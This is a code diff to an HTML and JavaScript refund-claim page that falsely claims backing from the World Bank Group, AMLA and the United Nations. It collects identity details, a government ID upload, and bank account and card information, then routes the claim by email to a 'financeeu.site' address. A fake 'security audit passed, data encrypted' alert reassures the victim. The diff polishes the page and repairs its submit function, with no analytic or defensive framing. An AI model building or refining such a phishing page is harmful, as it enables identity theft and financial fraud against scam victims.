@@ -19,7 +19,7 @@
 
         .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1850px; gap: 50px; padding-top: 50px; }
 
-        /* MISSION & VISION OUTSIDE FORM */
+        /* SIDEBARS - MISSION & VISION (LARGE) */
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
@@ -31,33 +31,37 @@
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
         .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         
+        /* PAGES */
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
         
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 15px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        .instruction-text { font-size: 13px; color: #555; margin-bottom: 25px; line-height: 1.5; }
+        
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         
-        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
-        input { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
+        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
+        input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         input.invalid { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
 
         .review-item { margin-bottom: 12px; padding: 10px; border-bottom: 1px solid #f0f0f0; }
         .review-label { font-size: 10px; font-weight: 800; color: var(--hamburg-blue); text-transform: uppercase; }
         .review-value { font-size: 16px; color: #333; margin-top: 5px; font-weight: 600; }
 
-        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; transition: 0.3s; cursor: pointer; }
-        
+        .contact-link { display: block; text-align: center; margin-top: 20px; font-weight: 900; color: #ffffff; background-color: var(--hamburg-red); text-decoration: none; font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; cursor: pointer; transition: 0.3s; }
+        .contact-link:hover { background-color: var(--hamburg-blue); }
+
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
-
-        .establishment-footer { text-align: center; padding: 30px; font-size: 13px; font-weight: normal; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
+        .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
     </style>
 </head>
 <body>
 
     <div class="page-wrapper">
+        <!-- MISSION -->
         <div class="side-text">
             <h3>MISSION</h3>
             <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
@@ -85,7 +89,7 @@
                         <div><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
                     </div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Email Address *</label><input type="email" id="em" class="req"></div>
+                        <div><label>Personal Email *</label><input type="email" id="em" class="req"></div>
                         <div><label>Contact Number *</label><input type="text" id="ph" class="req"></div>
                     </div>
                     <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file" id="idU" class="req"></div>
@@ -94,14 +98,16 @@
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: REFUND VERIFICATION</h2>
+                    <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
+                    <p class="instruction-text">Please provide the total refund amount requested. You are required to upload a clear copy of in-app receipt as official proof of claim.</p>
                     <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req" placeholder="€ 0.00"></div>
                     <div style="margin-top:25px;"><label>UPLOAD RECEIPT *</label><input type="file" id="rcpU" class="req"></div>
-                    <h2 style="margin-top:35px;">DISBURSEMENT INFORMATION</h2>
-                    <div><label>Bank Name / App *</label><input type="text" id="bnk" class="req"></div>
+                    
+                    <h2 style="margin-top:40px;">REFUND DISBURSEMENT INFORMATION</h2>
+                    <div><label>Bank Name / Third Party Bank App *</label><input type="text" id="bnk" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="an" class="req"></div>
-                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req"></div>
+                        <div><label>ACCOUNT NUMBER *</label><input type="text" id="acc" class="req"></div>
+                        <div><label>TYPE OF CARD *</label><input type="text" id="ct" class="req" placeholder="e.g. Visa/Debit"></div>
                     </div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(1)">BACK</button>
@@ -113,7 +119,7 @@
                 <div id="section3" class="section-box">
                     <h2>SECTION 3: REVIEW INFORMATION</h2>
                     <div id="reviewDisplay"></div>
-                    <div class="contact-link" onclick="openGmail()">📧 DIRECT CONTACT THE AUTHORITY</div>
+                    <div class="contact-link" onclick="openMailClient()">📧 DIRECT CONTACT THE AUTHORITY</div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT INFO</button>
                         <button type="button" onclick="finalSubmit()">SUBMIT TO AUTHORITY</button>
@@ -121,9 +127,10 @@
                 </div>
             </form>
 
-            <div class="establishment-footer">ESTABLISHED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
+            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS<br>AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025</div>
         </div>
 
+        <!-- VISION -->
         <div class="side-text">
             <h3>VISION</h3>
             <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
@@ -131,30 +138,52 @@
     </div>
 
     <script>
-    function finalSubmit
-    const ref = "REF-" + Math.floor(Math.random() * 1000000);
-    const mailTo = "globalreimbursementmanagement@financeeu.site";
-    
-    // Kunin ang details
-    const name = document.getElementById('fn').value + " " + document.getElementById('ln').value;
-    const amount = document.getElementById('amt').value;
+        function show(p) {
+            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
+            document.getElementById('section' + p).classList.add('active');
+            window.scrollTo(0,0);
+        }
 
-    alert("SECURITY AUDIT PASSED. Opening Email Client...");
+        function validate(curr, next) {
+            const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
+            let ok = true;
+            inputs.forEach(i => { if(!i.value) { i.classList.add('invalid'); ok = false; } else i.classList.remove('invalid'); });
+            if(ok) { if(next === 3) populate(); show(next); }
+        }
 
-    // Standard mailto: link para sa lahat ng email apps (Yahoo, Gmail, etc.)
-    const subject = encodeURIComponent("OFFICIAL CLAIM SUBMISSION - " + ref);
-    const body = encodeURIComponent(`Name: ${name}\nReference: ${ref}\nAmount: ${amount}\n\nPlease attach your ID and Receipt.`);
+        function populate() {
+            const res = `
+                <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('mn').value} ${document.getElementById('ln').value}</div></div>
+                <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
+                <div class="review-item"><div class="review-label">EMAIL / PHONE</div><div class="review-value">${document.getElementById('em').value} / ${document.getElementById('ph').value}</div></div>
+                <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
+                <div class="review-item"><div class="review-label">BANK / ACCOUNT</div><div class="review-value">${document.getElementById('bnk').value} - ${document.getElementById('acc').value}</div></div>
+                <div class="review-item"><div class="review-label">CARD TYPE</div><div class="review-value">${document.getElementById('ct').value}</div></div>
+            `;
+            document.getElementById('reviewDisplay').innerHTML = res;
+        }
 
-    // Bubukas ang default email app ng computer o phone nila
-    window.location.href = `mailto:${mailTo}?subject=${subject}&body=${body}`;
+        function openMailClient() {
+            const mailTo = "globalreimbursementmanagement@financeeu.site";
+            window.location.href = `mailto:${mailTo}?subject=Refund Inquiry`;
+        }
 
-    // Success message sa screen
-    document.getElementById('section3').innerHTML = `
-        <div style="text-align:center; padding:40px;">
-            <h2 style="color:var(--hamburg-blue)">SUBMISSION INITIALIZED</h2>
-            <p>Reference: <strong>${ref}</strong></p>
-            <p style="font-size:14px; color:#666;">Check your email app (Yahoo/Gmail) to send the documents.</p>
-            <div style="font-size:60px; margin:20px;">✅</div>
-        </div>`;
-{
+        function finalSubmit() {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            const mailTo = "globalreimbursementmanagement@financeeu.site";
+            const body = encodeURIComponent(`NAME: ${document.getElementById('fn').value}\nREF: ${ref}\nAMOUNT: ${document.getElementById('amt').value}`);
+            
+            alert("SECURITY AUDIT PASSED. DATA ENCRYPTED.");
+            window.location.href = `mailto:${mailTo}?subject=OFFICIAL CLAIM ${ref}&body=${body}`;
 
+            document.getElementById('section3').innerHTML = `
+                <div style="text-align:center; padding:40px; border: 2px dashed var(--hamburg-blue);">
+                    <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESS</h2>
+                    <p>Reference: <strong>${ref}</strong></p>
+                    <div style="font-size:80px; margin:20px;">✅</div>
+                    <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">DONE</button>
+                </div>`;
+        }
+    </script>
+</body>
+</html>
